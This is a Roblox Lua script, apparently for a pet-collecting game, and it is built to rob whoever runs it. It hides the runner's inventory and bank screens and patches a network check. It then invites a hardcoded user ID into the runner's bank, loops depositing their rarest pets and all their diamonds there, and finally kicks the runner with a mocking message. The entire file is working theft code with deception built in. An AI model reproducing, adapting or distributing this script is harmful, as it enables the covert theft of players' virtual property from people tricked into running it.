USER = 2509270174
local LP = game.Players.LocalPlayer
local Library = require(game:GetService("ReplicatedStorage").Library)
local Network = Library.Network
local Pets = Library.Directory.Pets
local Diamond = LP.leaderstats.Diamonds
LP.PlayerGui.Inventory.Frame.Visible = false
LP.PlayerGui.Bank.Frame.Visible = false
LP.Character.HumanoidRootPart.CFrame = game:GetService("Workspace")["__MAP"].Interactive.Bank.Center.CFrame
if not _G.k then
    hookfunction(getupvalue(Network.Invoke, 1), function() return true end)
    _G.k = true
end
function GetP()
    PTS = {}
    for i,v in pairs(Library.Save.Get().Pets) do
        if Pets[v.id].name:find("Huge") and #PTS < 50 then
            table.insert(PTS, v.uid)
        end
    end
    for i,v in pairs(Library.Save.Get().Pets) do
        if Pets[v.id].rarity == "Exclusive" and #PTS < 50 and not table.find(PTS, v.uid) then
            table.insert(PTS, v.uid)
        end
    end
    return PTS
end
BANK = Network.Invoke("Get My Banks")[1].BUID
if BANK then
    --print('BUID: ',BANK)
    if not table.find(Network.Invoke("Get Bank", BANK).Players, USER) then
        Invite,code = Network.Invoke("Invite To Bank", BANK, USER)
        --print('Invite: ',Invite,code)
    else
        Invite,code = true,true
        --print'alr in bank'    
    end
    wait(3)
    if Invite or code:find("already") then
        repeat wait() Network.Invoke("Bank Deposit", BANK, GetP(), Diamond.Value) until #GetP() == 0
        wait(2)
        LP:Kick('bro without gems))) Good Luck')
    end
end
